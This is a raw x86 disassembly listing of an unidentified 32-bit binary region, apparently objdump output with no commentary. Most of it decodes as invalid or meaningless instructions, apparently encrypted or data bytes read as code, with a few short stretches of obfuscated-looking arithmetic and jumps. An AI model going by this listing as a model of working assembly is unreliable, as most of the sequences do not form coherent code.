  409d68:	adc    edi,DWORD PTR [edi+0x5f59154e]
  409d6e:	pop    edx
  409d6f:	shl    DWORD PTR [ebx-0x5a96bfce],0x3c
  409d76:	enter  0x6183,0x4a
  409d7a:	call   0xcb4f:0x9468136e
  409d81:	call   0xd17c:0xcaf87186
  409d88:	out    0x3d,eax
  409d8a:	test   BYTE PTR [edi],dl
  409d8c:	sub    ebx,DWORD PTR [eax]
  409d8e:	lods   eax,DWORD PTR ds:[esi]
  409d8f:	in     eax,0x40
  409d91:	fdivr  DWORD PTR [eax-0x7a]
  409d94:	(bad)  
  409d95:	int3   
  409d96:	test   al,0x53
  409d98:	ss adc al,0xe1
  409d9b:	fdivr  QWORD PTR [ecx-0x6bb6fc5c]
  409da1:	and    ah,BYTE PTR ds:0xb76c768d
  409da7:	xchg   esi,eax
  409da8:	xchg   esp,eax
  409da9:	icebp  
  409daa:	jp     0x409da9
  409dac:	or     DWORD PTR [edx-0x5a6bfb8c],esp
  409db2:	jo     0x409dcd
  409db4:	push   cs
  409db5:	clc    
  409db6:	jmp    0x2a29b894
  409dbb:	jo     0x409dc5
  409dbd:	mov    eax,DWORD PTR [eax+ebp*1+0x7ac335dc]
  409dc4:	mov    esp,?
  409dc6:	mov    edi,DWORD PTR [edx]
  409dc8:	sub    edi,0xac05e93
  409dce:	out    dx,eax
  409dcf:	lods   eax,DWORD PTR cs:[esi]
  409dd1:	stos   BYTE PTR es:[edi],al
  409dd2:	adc    eax,0x3b434f9
  409dd7:	lods   al,BYTE PTR ds:[esi]
  409dd8:	sub    eax,ecx
  409dda:	enter  0x7b7a,0xb5
  409dde:	xchg   ebp,ebx
  409de0:	clc    
  409de1:	lock (bad) 
  409de4:	cmp    ch,0x94
  409de7:	ret    0xb6b5
  409dea:	mov    ebx,esi
  409dec:	jb     0x409e67
  409dee:	pop    ebp
  409def:	punpcklwd mm4,DWORD PTR [eax+0x27]
  409df3:	pushf  
  409df4:	call   0xc7ce:0x25d552f5
  409dfb:	adc    ch,BYTE PTR [esi+0x1d2bfec2]
  409e01:	or     edx,DWORD PTR [ebx-0x1a]
  409e04:	cmp    DWORD PTR [ecx+eiz*1-0x73e80652],ebx
  409e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e0c:	xchg   esp,eax
  409e0d:	adc    BYTE PTR [ebp+0x4a6a8e19],bh
  409e13:	add    esp,DWORD PTR [ecx+0x6ecdc54f]
  409e19:	sub    al,BYTE PTR [esi]
  409e1b:	outs   dx,DWORD PTR ds:[esi]
  409e1c:	adc    ebp,eax
  409e1e:	lea    edi,[ebx]
  409e20:	cmp    ecx,DWORD PTR fs:[si-0x7f29]
  409e26:	cmc    
  409e27:	cdq    
  409e28:	push   ss
  409e29:	jl     0x409dd8
  409e2b:	inc    ebp
  409e2c:	aad    0x6e
  409e2e:	push   ebp
  409e2f:	xchg   edi,eax
  409e30:	dec    esp
  409e31:	jno    0x409e21
  409e33:	call   0x6d55beb6
  409e38:	repz loopne 0x409e0a
  409e3b:	inc    eax
  409e3c:	fsubr  DWORD PTR [edx+0x7e]
  409e3f:	sub    BYTE PTR ds:0x5c5eb6e0,0x2
  409e46:	das    
  409e47:	xrelease mov DWORD PTR [ebx-0x39],ecx
  409e4b:	in     al,0x8c
  409e4d:	push   cs
  409e4e:	repz xchg esi,eax
  409e50:	ds scas al,BYTE PTR es:[edi]
  409e52:	cwde   
  409e53:	rcr    DWORD PTR [edi-0x65822a55],cl
  409e59:	sub    eax,0x8fd76758
  409e5e:	sahf   
  409e5f:	pop    eax
  409e60:	add    ecx,ebx
  409e62:	jl     0x409e10
  409e64:	(bad)  
  409e65:	addr16 push eax
  409e67:	jnp    0x409df2
  409e69:	mov    ch,0x72
  409e6b:	fsub   QWORD PTR [ebp-0x20a3e76]
  409e71:	cli    
  409e72:	fiadd  WORD PTR [edx+0x5714adec]
  409e78:	sub    al,0xf4
  409e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e7b:	in     al,dx
  409e7c:	mov    bl,0xa8
  409e7e:	cmp    cl,BYTE PTR [eax+0x797f7743]
  409e84:	rcl    DWORD PTR [esi*4+0x389097e5],0x74
  409e8c:	dec    edx
  409e8d:	sub    al,dl
  409e8f:	dec    ebp
  409e90:	sbb    eax,0x6fa12019
  409e95:	gs inc ebx
  409e97:	inc    eax
  409e98:	mov    ds:0x935ef6ea,eax
  409e9d:	push   0xffffff9e
  409e9f:	cmp    DWORD PTR [ebp-0x33cff583],ebx
  409ea5:	sbb    ah,BYTE PTR ds:0xcf77bc9c
  409eab:	mov    esp,0xa46e22e0
  409eb0:	pop    edx
  409eb1:	fwait
  409eb2:	aas    
  409eb3:	or     edx,esi
  409eb5:	jl     0x409f20
  409eb7:	fsubr  DWORD PTR [edx-0x7f0e6db8]
  409ebd:	pop    esp
  409ebe:	int3   
  409ebf:	or     al,0x5d
  409ec1:	enter  0x1385,0xc5
  409ec5:	or     BYTE PTR [edi],bl
  409ec7:	push   ss
  409ec8:	les    esp,FWORD PTR [edi+0x6203c698]
  409ece:	repnz pop es
  409ed0:	sbb    eax,0xe90abbd9
  409ed5:	mov    esi,0x8a9acff2
  409eda:	(bad)  
  409edb:	ins    DWORD PTR es:[edi],dx
  409edc:	test   al,0x58
  409ede:	scas   eax,DWORD PTR es:[edi]
  409edf:	dec    ecx
  409ee0:	mov    al,ds:0x3d29d9e1
  409ee5:	xchg   edx,eax
  409ee6:	jb     0x409f61
  409ee8:	retf   
  409ee9:	jae    0x409ef9
  409eeb:	out    0xc8,eax
  409eed:	int3   
  409eee:	mov    dh,0xd5
  409ef0:	imul   eax,DWORD PTR [edx-0x2f4f88c0],0x408f0158
  409efa:	push   ecx
  409efb:	pop    ecx
  409efc:	lods   eax,DWORD PTR ds:[esi]
  409efd:	jecxz  0x409eb4
  409eff:	stos   DWORD PTR es:[edi],eax
  409f00:	jne    0x409f38
  409f02:	lock jle 0x409f46
  409f05:	enter  0x3f18,0x40
  409f09:	pop    es
  409f0a:	in     al,0x4e
  409f0c:	jb     0x409e94
  409f0e:	jp     0x409f84
  409f10:	xchg   ebp,ebp
  409f12:	test   bh,bl
  409f14:	ins    BYTE PTR es:[edi],dx
  409f15:	repz test BYTE PTR [eax+0x34],cl
  409f19:	ret    0x3d90
  409f1c:	adc    BYTE PTR [ecx+0x39],al
  409f1f:	ja     0x409f86
  409f21:	mov    esp,0x3ff71cc8
  409f26:	mov    edx,0x7f671a52
  409f2b:	shl    DWORD PTR [ebp+0x5a879928],cl
  409f31:	fidivr DWORD PTR [edi+0x52]
  409f34:	dec    ebp
  409f35:	ss fcmove st,st(0)
  409f38:	or     eax,0x9345651f
  409f3d:	inc    eax
  409f3e:	and    ah,al
  409f40:	fisttp DWORD PTR [edx-0x3a9bbaab]
  409f46:	cmc    
  409f47:	jbe    0x409ee5
  409f49:	inc    ebx
  409f4a:	in     al,dx
  409f4b:	fistp  WORD PTR [eax+0x3e864ab2]
  409f51:	cmp    bh,BYTE PTR [edx+0xfb505a8]
  409f57:	pusha  
  409f58:	and    eax,0xa6f8c4a2
  409f5d:	loope  0x409f34
  409f5f:	dec    eax
  409f60:	(bad)  
  409f61:	ins    DWORD PTR es:[edi],dx
  409f62:	es aas 
  409f64:	push   0xffffffe8
  409f66:	dec    ecx
  409f67:	inc    edx
  409f68:	lahf   
  409f69:	xor    DWORD PTR [edi+0x666a4d44],eax
  409f6f:	rol    BYTE PTR [esi+0x6e3e0d3a],1
  409f75:	jle    0x409f59
  409f77:	jecxz  0x409f8e
  409f79:	(bad)  
  409f7b:	xchg   esi,eax
  409f7c:	mov    DWORD PTR [ecx-0x7a73a67e],eax
  409f82:	retf   0xc48b
  409f85:	xchg   edi,eax
  409f86:	push   ds
  409f87:	js     0x409f4e
  409f89:	inc    ebx
  409f8a:	seta   BYTE PTR [ebx]
  409f8d:	stos   BYTE PTR es:[edi],al
  409f8e:	and    al,BYTE PTR [edx+eax*1+0x7c]
  409f92:	and    al,0xec
  409f94:	sbb    bl,BYTE PTR [bp+0x2428]
  409f99:	push   eax
  409f9a:	mov    gs,ecx
  409f9c:	cwde   
  409f9d:	pop    ebx
  409f9e:	fsubrp st(2),st
  409fa0:	in     eax,0x9a
  409fa2:	fwait
  409fa3:	mov    cl,0x97
  409fa5:	test   eax,0xbbd02e10
  409faa:	je     0x409fef
  409fac:	xlat   BYTE PTR ds:[ebx]
  409fad:	jp     0x40a01f
  409faf:	adc    BYTE PTR [ecx-0x20],bl
  409fb2:	jbe    0x40a00d
  409fb4:	mov    edx,0x2ea35e44
  409fb9:	inc    edx
  409fba:	dec    ecx
  409fbb:	ja     0x409f5c
  409fbd:	and    eax,0x70b441de
  409fc2:	lods   eax,DWORD PTR ds:[esi]
  409fc3:	mov    al,ds:0x39cd3a44
  409fc8:	cmp    BYTE PTR [esi+ecx*2+0x51],ah
  409fcc:	pop    ds
  409fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fce:	fdivr  DWORD PTR [eax]
  409fd0:	jmp    0x409fac
  409fd2:	dec    edx
  409fd3:	in     eax,0x9a
  409fd5:	cs dec edi
  409fd7:	inc    ebx
  409fd8:	pop    edi
  409fd9:	xor    al,0x1e
  409fdb:	mov    bh,0xd
  409fdd:	add    ah,BYTE PTR [edi]
  409fdf:	adc    edi,DWORD PTR [edi-0x75]
  409fe2:	test   DWORD PTR [edx+0x4e1ba9e3],ecx
  409fe8:	(bad)  
  409fe9:	in     eax,dx
  409fea:	mov    ds:0x239fa637,al
  409fef:	jp     0x40a027
  409ff1:	imul   edi,DWORD PTR [ecx],0xffffffc6
  409ff4:	ret    
  409ff5:	gs push esi
  409ff7:	ret    0x2ba7
  409ffa:	inc    ebp
  409ffb:	ja     0x40a059
  409ffd:	mov    cl,0x7e
  409fff:	dec    eax
  40a000:	xchg   edx,eax
  40a001:	and    DWORD PTR [ebx-0x74],ebx
  40a004:	adc    BYTE PTR [esp+ebx*4],cl
  40a007:	test   BYTE PTR ds:0x33f04d8b,dl
  40a00d:	mov    BYTE PTR [ebx],0xc7
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx+0x4e]
  40a02a:	shl    BYTE PTR [edx],1
  40a02c:	dec    eax
  40a02d:	jo     0x40a01d
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	test   eax,0x2f241e56
  40a03a:	std    
  40a03b:	jge    0x40a07b
  40a03d:	push   ss
  40a03e:	jne    0x409fc5
  40a040:	cmp    BYTE PTR [ecx],0xdf
  40a043:	adc    edx,edx
  40a045:	repnz push cs
  40a047:	mov    ebx,eax
  40a049:	cdq    
  40a04a:	mov    dh,0x1c
  40a04c:	and    bl,BYTE PTR [eax+0x73]
  40a04f:	push   eax
  40a050:	jg     0x40a073
  40a052:	shr    DWORD PTR [ebp-0x56],cl
  40a055:	retf   0x3932
  40a058:	arpl   WORD PTR ds:0xf6c8fc35,bp
  40a05e:	xchg   bh,dh
  40a060:	aas    
  40a061:	push   edi
  40a062:	push   edi
  40a063:	xchg   esp,eax
  40a064:	adc    DWORD PTR ds:0xcffdc2cb,0xffffff96
  40a06b:	push   esi
  40a06c:	sbb    al,0xe6
  40a06e:	js     0x40a070
  40a070:	daa    
  40a071:	push   0xa7deea10
  40a076:	pop    ds
  40a077:	ret    
  40a078:	jl     0x40a0b1
  40a07a:	mov    dh,0x1d
  40a07c:	je     0x40a0d0
  40a07e:	pop    ss
  40a07f:	(bad)  
  40a080:	push   ebp
  40a081:	push   cs
  40a082:	in     eax,0xc
  40a084:	not    DWORD PTR [edi+ebp*8-0x15f95603]
  40a08b:	and    eax,0x2e426a76
  40a090:	sbb    eax,DWORD PTR [ebx]
  40a092:	jne    0x40a0de
  40a094:	mov    edx,0xe07076
  40a099:	sub    al,0x8f
  40a09b:	test   al,0x8c
  40a09d:	outs   dx,BYTE PTR ds:[esi]
  40a09e:	retf   
  40a09f:	pop    esi
  40a0a0:	sub    eax,0x6f29d36c
  40a0a5:	jno    0x40a0d5
  40a0a7:	lods   al,BYTE PTR ds:[esi]
  40a0a8:	push   0xffffffcb
  40a0aa:	jnp    0x40a041
  40a0ac:	xchg   esp,eax
  40a0ad:	inc    ebx
  40a0ae:	cs call 0xc967944
  40a0b4:	inc    eax
  40a0b5:	scas   eax,DWORD PTR es:[edi]
  40a0b6:	push   eax
  40a0b7:	cwde   
  40a0b8:	sub    BYTE PTR [ebx+0x30d3f2b6],bh
  40a0be:	in     eax,dx
  40a0bf:	push   esi
  40a0c0:	ins    DWORD PTR es:[edi],dx
  40a0c1:	std    
  40a0c2:	inc    ecx
  40a0c3:	repz pop es
  40a0c5:	(bad)  
  40a0c7:	xor    DWORD PTR [ebx-0x31a6b7f1],esi
  40a0cd:	jns    0x40a065
  40a0cf:	cmp    ebp,DWORD PTR [esi+0x7d3a43a]
  40a0d5:	mov    ds:0x5c34dbc0,eax
  40a0da:	pop    ecx
  40a0db:	scas   eax,DWORD PTR es:[edi]
  40a0dc:	iret   
  40a0dd:	sbb    al,BYTE PTR [edi-0x44]
  40a0e0:	fild   WORD PTR [esi+0x411913e7]
  40a0e6:	lock pop ebp
  40a0e9:	pop    edi
  40a0ea:	cmc    
  40a0eb:	dec    ebx
  40a0ec:	dec    ebx
  40a0ed:	pop    edi
  40a0ee:	jae    0x40a141
  40a0f0:	fisub  WORD PTR [edx+0x7]
  40a0f3:	sub    bl,BYTE PTR [edi+ebp*1]
  40a0f6:	cmp    ch,BYTE PTR [esi-0x66cac67]
  40a0fc:	(bad)
  40a0ff:	inc    esi
  40a100:	retf   0x9d3
  40a103:	fadd   st,st(5)
  40a105:	call   0xeec88d4f
  40a10a:	cmp    esi,ebp
  40a10c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a10d:	ret    0x43f6
  40a110:	pop    edx
  40a111:	mov    cl,0xc0
  40a113:	shr    DWORD PTR [edx],0xa0
  40a116:	shl    bl,0xf4
  40a119:	pop    esp
  40a11a:	jmp    DWORD PTR [edi]
  40a11c:	out    dx,eax
  40a11d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a11e:	jae    0x40a0ba
  40a120:	xchg   ebx,eax
  40a121:	ret    0x781b
  40a124:	jp     0x40a0db
  40a126:	aad    0x65
  40a128:	cmc    
  40a129:	out    0x9c,al
  40a12b:	add    dl,BYTE PTR [ebx]
  40a12d:	stos   DWORD PTR es:[edi],eax
  40a12e:	cwde   
  40a12f:	push   edx
  40a130:	call   0x450b72b8
  40a135:	mov    ebx,0x997d8caa
  40a13a:	pusha  
  40a13b:	mov    ecx,0xb0883929
  40a140:	lds    ebp,FWORD PTR [esi+ecx*2+0x40e25983]
  40a147:	aas    
  40a148:	jecxz  0x40a14d
  40a14a:	jbe    0x40a0fb
  40a14c:	mov    eax,ds:0xec65788b
  40a151:	mov    edi,0x71aea859
  40a156:	sbb    al,0x69
  40a158:	sbb    ebp,DWORD PTR [esi+0x5e6b37ec]
  40a15e:	fmul   QWORD PTR [esi+0x4438d871]
  40a164:	cmp    al,bl
  40a166:	pop    ss
  40a167:	mov    al,0xec
  40a169:	dec    ebp
  40a16a:	cdq    
  40a16b:	jge    0x40a104
  40a16d:	mov    dh,0xc7
  40a16f:	(bad)  
  40a170:	repnz sbb eax,0x57c9fe82
  40a176:	sub    al,0x68
  40a178:	push   cs
  40a179:	ficom  WORD PTR gs:[esi-0x1a]
  40a17d:	pop    ebx
  40a17e:	clc    
  40a17f:	mov    dl,0x5c
  40a181:	es cmp bl,al
  40a184:	dec    edx
  40a185:	and    eax,DWORD PTR [eax+0x3d]
  40a188:	retf   0xca9a
  40a18b:	in     al,0x6e
  40a18d:	and    al,0x68
  40a18f:	cmp    eax,0xba8ce094
  40a194:	cmp    BYTE PTR [esi-0xd],cl
  40a197:	jo     0x40a12d
  40a199:	aas    
  40a19a:	push   ebp
  40a19b:	bound  esp,QWORD PTR [ebx-0x69b477f2]
  40a1a1:	mov    DWORD PTR [ebp+0x1ca7c55e],edx
  40a1a7:	sbb    BYTE PTR es:[eax],dh
  40a1aa:	ins    DWORD PTR es:[edi],dx
  40a1ab:	or     BYTE PTR [ebp-0x6d0fe4d0],al
  40a1b1:	mov    ah,0x42
  40a1b3:	or     eax,0x4be1b116
  40a1b8:	inc    edi
  40a1b9:	or     eax,0x9e3515e0
  40a1be:	push   esi
  40a1bf:	add    ebx,DWORD PTR [edi]
  40a1c1:	inc    ebx
  40a1c2:	loopne 0x40a215
  40a1c4:	aam    0x67
  40a1c6:	mov    edi,0x24e3cfce
  40a1cb:	jmp    0xf1bd8725
  40a1d0:	pop    ecx
  40a1d1:	int3   
  40a1d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1d3:	arpl   WORD PTR [ebp-0x6b37be6f],bx
  40a1d9:	jo     0x40a1b8
  40a1db:	popa   
  40a1dc:	dec    eax
  40a1de:	mov    eax,0xd92a513f
  40a1e3:	stos   DWORD PTR es:[edi],eax
  40a1e4:	popa   
  40a1e5:	fst    DWORD PTR es:[edx+0x30]
  40a1e9:	pushf  
  40a1ea:	mov    esp,0x804b333
  40a1ef:	dec    esi
  40a1f0:	mov    cl,0xe6
  40a1f2:	mov    cl,BYTE PTR ds:0xca63
  40a1f7:	in     al,0xcb
  40a1f9:	push   ss
  40a1fa:	mov    WORD PTR [ecx-0x24c56e1e],gs
  40a200:	nop
  40a201:	push   0x9bb40d45
  40a206:	or     eax,0xb8619fb5
  40a20b:	inc    ebx
  40a20c:	imul   ebp,DWORD PTR [edi+ebp*8+0x1d3c8cdb],0x12
  40a214:	inc    eax
  40a215:	outs   dx,DWORD PTR ds:[esi]
  40a216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a217:	jb     0x40a27c
  40a219:	sub    bh,BYTE PTR [edx-0x7af36377]
  40a21f:	push   eax
  40a220:	push   edx
  40a221:	jo     0x40a24a
  40a223:	gs js  0x40a250
  40a226:	sub    al,0x94
  40a228:	stos   DWORD PTR es:[edi],eax
  40a229:	rol    BYTE PTR [edi],1
  40a22b:	cmp    al,0x55
  40a22d:	rcl    BYTE PTR [eax+ecx*2-0x4a],cl
  40a231:	fnsave [eax]
  40a233:	or     al,BYTE PTR [eax]
  40a235:	xor    DWORD PTR [edx],ebp
  40a237:	dec    esp
  40a238:	jle    0x40a1c4
  40a23a:	cld    
  40a23b:	xchg   DWORD PTR [edx-0x63],eax
  40a23e:	hlt    
  40a23f:	jg     0x40a278
  40a241:	mov    dl,0xbc
  40a243:	data16 fnop 
  40a246:	push   0x452dcdbb
  40a24b:	loopne 0x40a29f
  40a24d:	or     DWORD PTR ds:0x112a91c4,0xf6d3c403
  40a257:	adc    BYTE PTR [edi-0x5a],ah
  40a25a:	pop    edi
  40a25b:	dec    edi
  40a25d:	les    ebx,FWORD PTR [ecx]
  40a25f:	dec    edi
  40a260:	add    bh,BYTE PTR [ebx+0x41]
  40a263:	dec    eax
  40a264:	jg     0x40a2b7
  40a266:	xor    eax,DWORD PTR [ebp+edx*2-0x73]
  40a26a:	add    al,0x41
  40a26c:	retf   
  40a26d:	xor    edx,DWORD PTR [esi-0x17a7151b]
  40a273:	xchg   ebx,eax
  40a274:	pop    ecx
  40a275:	sub    esp,DWORD PTR [eax+eiz*4]
  40a278:	xchg   esp,eax
  40a279:	fidiv  DWORD PTR [ebx-0x52]
  40a27c:	outs   dx,DWORD PTR ds:[esi]
  40a27d:	xchg   edi,eax
  40a27e:	or     al,0xc0
  40a280:	push   0xffffffa2
  40a282:	and    ecx,eax
  40a284:	(bad)
  40a287:	bound  ebp,QWORD PTR [esi]
  40a289:	adc    dh,bh
  40a28b:	es fsubp st(7),st
  40a28e:	std    
  40a28f:	pop    ebp
  40a290:	std    
  40a291:	jge    0x40a26a
  40a293:	pop    ecx
  40a294:	mov    dh,0x69
  40a296:	outs   dx,DWORD PTR ds:[esi]
  40a297:	xor    al,0xef
  40a299:	imul   edx,DWORD PTR [edi-0x45f953ad],0x2d7bb38e
  40a2a3:	sbb    dh,BYTE PTR [esi]
  40a2a5:	xchg   edi,eax
  40a2a6:	inc    eax
  40a2a7:	dec    ebp
  40a2a8:	mov    al,0x59
  40a2aa:	mov    BYTE PTR [edx+0x2],0x5
  40a2ae:	call   0x100c:0xb16a5c85
  40a2b5:	(bad)  
  40a2b6:	fisubr WORD PTR [esi+0x62]
  40a2b9:	and    BYTE PTR [edi+0x612b0b2c],0xe7
  40a2c0:	ins    DWORD PTR es:[edi],dx
  40a2c1:	mov    edx,0xf24f2493
  40a2c6:	jne    0x40a338
  40a2c8:	pop    es
  40a2c9:	or     DWORD PTR [edx-0x2bcb986b],edi
  40a2cf:	cli    
  40a2d0:	xor    eax,0x6c4039c4
  40a2d5:	xchg   ecx,eax
  40a2d6:	test   DWORD PTR [esi-0x3a0d3fd5],0xf217a496
  40a2e0:	mov    cl,0x29
  40a2e2:	sbb    DWORD PTR [esi-0x6f],ebp
  40a2e5:	jecxz  0x40a2fc
  40a2e7:	bound  eax,QWORD PTR es:[esi]
  40a2ea:	or     al,0x98
  40a2ec:	ja     0x40a2fd
  40a2ee:	and    esi,DWORD PTR ds:0xffcc2d28
  40a2f4:	pop    edi
  40a2f5:	push   ds
  40a2f6:	jmp    DWORD PTR [esp+eax*2+0x39]
  40a2fa:	pop    esp
  40a2fb:	mov    dh,0x73
  40a2fd:	int    0xf4
  40a2ff:	(bad)  
  40a301:	push   esi
  40a302:	add    esi,ebx
  40a304:	jb     0x40a36e
  40a306:	jle    0x40a2c7
  40a308:	mov    bl,0x0
  40a30a:	xchg   edx,eax
  40a30b:	pop    ss
  40a30c:	out    dx,eax
  40a30d:	xor    eax,0xf16f83cc
  40a312:	retf   0x6c5d
  40a315:	push   esi
  40a316:	leave  
  40a317:	int    0x9a
  40a319:	js     0x40a307
  40a31b:	xchg   esp,eax
  40a31c:	outs   dx,DWORD PTR ds:[esi]
  40a31d:	std    
  40a31e:	gs test al,0xf2
  40a321:	aas    
  40a322:	inc    eax
  40a323:	(bad)  
  40a324:	in     eax,0xc5
  40a326:	push   edx
  40a327:	cmp    bl,BYTE PTR [ebp+eiz*4+0x1f]
  40a32b:	push   eax
  40a32c:	xchg   edx,eax
  40a32d:	setno  BYTE PTR [ebp+0x5b]
  40a331:	xchg   DWORD PTR [ebp+ebp*8-0x74],ebp
  40a335:	jmp    0x335fa6e5
  40a33a:	into   
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	or     BYTE PTR [edx+esi*1],cl
  40a3ce:	retf   
  40a3cf:	jl     0x40a3bb
  40a3d1:	jle    0x40a451
  40a3d3:	jp     0x40a452
  40a3d5:	jle    0x40a455
  40a3d7:	xchg   edx,eax
  40a3d8:	pop    esp
  40a3d9:	and    ecx,DWORD PTR [ecx+ebp*4-0x33]
  40a3dd:	mov    DWORD PTR [ebx-0xa],0xa43864cc
  40a3e4:	test   esi,eax
  40a3e6:	push   ecx
  40a3e7:	jae    0x40a3ae
  40a3e9:	enter  0x477a,0x34
  40a3ed:	lea    edi,[ebp-0x1f]
  40a3f0:	xor    eax,0x6deb1092
  40a3f5:	std    
  40a3f6:	add    al,ah
  40a3f8:	fdivr  DWORD PTR [eax+0x4db0484d]
  40a3fe:	xchg   ebp,eax
  40a3ff:	repz je 0x40a431
  40a402:	scas   eax,DWORD PTR es:[edi]
  40a403:	cld    
  40a404:	sub    BYTE PTR [edi+0x6c],bl
  40a407:	retf   0x962f
  40a40a:	ja     0x40a46d
  40a40c:	arpl   dx,bp
  40a40e:	(bad)  
  40a410:	jo     0x40a48b
  40a412:	(bad)  
  40a413:	mov    edi,0xaa96a81d
  40a418:	les    ebx,FWORD PTR [edx]
  40a41a:	out    0x5c,al
  40a41c:	add    DWORD PTR [esi+0x2ae31367],edx
  40a422:	loopne 0x40a491
  40a424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a425:	sbb    bl,BYTE PTR [edx+ebp*2]
  40a428:	cdq    
  40a429:	jbe    0x40a443
  40a42b:	cdq    
  40a42c:	dec    ebx
  40a42d:	mov    eax,ds:0xccc8d15a
  40a432:	and    DWORD PTR [ebx+0x1b],0x1e5b7d98
  40a439:	add    dh,BYTE PTR [ebx]
  40a43b:	cmp    DWORD PTR [esi-0x22109e1c],ebx
  40a441:	aaa    
  40a442:	popa   
  40a443:	mov    eax,0x8cd5f7ba
  40a448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a449:	stc    
  40a44a:	push   ebp
  40a44b:	ret    
  40a44c:	or     eax,0xa5a24420
  40a451:	mov    cl,BYTE PTR [edi+0x546d0d6b]
  40a457:	mov    esi,DWORD PTR [ebx]
  40a459:	out    0xca,eax
  40a45b:	cdq    
  40a45c:	fnstenv [esp+edx*1+0x4e9816e9]
  40a463:	cmp    eax,0x8fe8e49f
  40a468:	push   ecx
  40a469:	add    DWORD PTR [esp+edi*1-0x3c51361e],esi
  40a470:	adc    DWORD PTR [esi+0x7a],eax
  40a473:	jge    0x40a4a3
  40a475:	mov    BYTE PTR [esi],ah
  40a477:	jae    0x40a465
  40a479:	jg     0x40a41e
  40a47b:	or     al,0x39
  40a47d:	and    al,0xad
  40a47f:	rol    DWORD PTR [ebx-0x3b567df8],0x32
  40a486:	test   al,0x7d
  40a488:	or     esp,ecx
  40a48a:	ficomp DWORD PTR [ecx-0xc]
  40a48d:	sbb    eax,0x15771ad9
  40a492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a493:	mov    bh,0x51
  40a495:	addr16 pop eax
  40a497:	and    bh,BYTE PTR [ecx-0x2f]
  40a49a:	mov    ebx,0x92045464
  40a49f:	mov    esp,0x133cb194
  40a4a4:	hlt    
  40a4a5:	dec    esi
  40a4a6:	cmp    DWORD PTR [ebx],ebp
  40a4a8:	iret   
  40a4a9:	dec    ecx
  40a4aa:	(bad)  
  40a4ab:	pop    ebx
  40a4ac:	test   DWORD PTR [eax],edi
  40a4ae:	ss aas 
  40a4b0:	sub    DWORD PTR [esi],ebp
  40a4b2:	icebp  
  40a4b3:	push   ds
  40a4b4:	pushf  
  40a4b5:	test   eax,0x4832a2
  40a4ba:	jp     0x40a495
  40a4bc:	call   0xa8032d85
  40a4c1:	mov    ?,esp
  40a4c3:	adc    al,0xf8
  40a4c5:	mul    BYTE PTR [ebx+0x57]
  40a4c8:	sbb    al,0x6e
  40a4ca:	jg     0x40a453
  40a4cc:	fwait
  40a4cd:	jnp    0x40a467
  40a4cf:	sub    al,0x47
  40a4d1:	(bad)  
  40a4d2:	mov    eax,0x3cd98b05
  40a4d7:	(bad)  
  40a4d8:	xor    dl,BYTE PTR [edx+0x24]
  40a4db:	cmp    dl,ch
  40a4dd:	mov    ss,WORD PTR [eax+0x29]
  40a4e0:	push   esi
  40a4e1:	jb     0x40a47c
  40a4e3:	outs   dx,BYTE PTR ds:[esi]
  40a4e4:	mov    ebx,0x30d9f321
  40a4e9:	and    cl,ah
  40a4eb:	sahf   
  40a4ec:	adc    edi,ebx
  40a4ee:	mov    ecx,0xc0140714
  40a4f3:	scas   eax,DWORD PTR es:[edi]
  40a4f4:	ins    BYTE PTR es:[edi],dx
  40a4f5:	ins    DWORD PTR es:[edi],dx
  40a4f6:	push   esi
  40a4f7:	ficomp WORD PTR [edi-0x3a]
  40a4fa:	lods   al,BYTE PTR ds:[esi]
  40a4fb:	or     al,0x89
  40a4fd:	cmp    ch,BYTE PTR [esi-0x58]
  40a500:	push   edx
  40a501:	inc    ecx
